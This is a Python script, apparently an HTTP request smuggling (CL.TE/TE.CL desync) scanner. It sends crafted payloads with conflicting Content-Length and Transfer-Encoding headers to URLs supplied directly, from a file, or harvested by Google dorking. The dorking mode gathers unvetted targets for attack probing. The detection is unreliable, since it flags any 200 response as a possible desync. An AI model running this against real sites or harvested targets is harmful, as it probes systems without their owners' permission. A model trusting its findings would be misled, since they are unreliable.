import requests
import argparse
import sys
import time
import pandas as pd
from googlesearch import search

def check_desync(url, results):
    print(f"Checking URL: {url}")
    
    # Prepare more comprehensive payloads for CL.TE and TE.CL desync checks
    payloads = [
        {
            "description": "CL.TE with short body",
            "headers": {
                "Content-Length": "5",
                "Transfer-Encoding": "chunked"
            },
            "body": "0\r\n\r\nG"
        },
        {
            "description": "TE.CL with short chunk",
            "headers": {
                "Transfer-Encoding": "chunked"
            },
            "body": "5\r\nG\r\n0\r\n\r\n"
        },
        {
            "description": "CL.TE with long body",
            "headers": {
                "Content-Length": "15",
                "Transfer-Encoding": "chunked"
            },
            "body": "0\r\n\r\nG\r\n0\r\n\r\n"
        },
        {
            "description": "TE.CL with multiple chunks",
            "headers": {
                "Transfer-Encoding": "chunked"
            },
            "body": "5\r\nG\r\n5\r\n12345\r\n0\r\n\r\n"
        }
    ]

    methods = ['POST', 'PUT']

    for payload in payloads:
        for method in methods:
            try:
                if method == 'POST':
                    response = requests.post(url, headers=payload['headers'], data=payload['body'], timeout=10)
                elif method == 'PUT':
                    response = requests.put(url, headers=payload['headers'], data=payload['body'], timeout=10)
                
                result = {
                    "url": url,
                    "payload_description": payload['description'],
                    "method": method,
                    "status_code": response.status_code,
                    "possible_desync": response.status_code == 200
                }
                results.append(result)

                print(f"Payload description: {payload['description']} | Method: {method} | Status code: {response.status_code}")
                if response.status_code == 200:
                    print(f"Possible desync detected with payload: {payload} and method: {method}")
                time.sleep(1)  # Adding a delay between requests to avoid overloading the server
            except requests.exceptions.RequestException as e:
                print(f"Error occurred with payload: {payload} and method: {method} | Error: {e}")

def read_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file if line.strip()]
    return urls

def search_google_dorking(dork_query, num_results):
    print(f"Searching Google with dork query: {dork_query}")
    try:
        search_results = []
        for result in search(dork_query, num_results=num_results):
            search_results.append(result)
            print(result)
        return search_results
    except Exception as e:
        print(f"Error during Google search: {e}")
        return []

def save_results_to_file(results, output_format):
    if output_format == "screen":
        for result in results:
            print(result)
    elif output_format == "csv":
        df = pd.DataFrame(results)
        df.to_csv("results.csv", index=False)
        print("Results saved to results.csv")
    else:  # Default to text file
        with open("results.txt", "w") as file:
            for result in results:
                file.write(f"{result}\n")
        print("Results saved to results.txt")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Check for client-side desynchronization vulnerabilities.')

    parser.add_argument('-u', '--url', type=str, help='Single URL to check for desynchronization vulnerability.')
    parser.add_argument('-f', '--file', type=str, help='File containing a list of URLs to check for desynchronization vulnerabilities.')
    parser.add_argument('-d', '--dork', type=str, help='Google dorking query to search for potential targets.')
    parser.add_argument('-n', '--num', type=int, default=10, help='Number of Google search results to fetch.')
    parser.add_argument('-o', '--output', type=str, choices=['screen', 'text', 'csv'], default='text', help='Output format: screen, text (default), or csv.')

    args = parser.parse_args()

    results = []

    if args.url:
        check_desync(args.url, results)
    elif args.file:
        urls = read_urls_from_file(args.file)
        for url in urls:
            check_desync(url, results)
    elif args.dork:
        search_results = search_google_dorking(args.dork, args.num)
        for result in search_results:
            check_desync(result, results)
    else:
        print("Please provide a URL with -u, a file with -f, or a Google dorking query with -d")
        sys.exit(1)

    save_results_to_file(results, args.output)

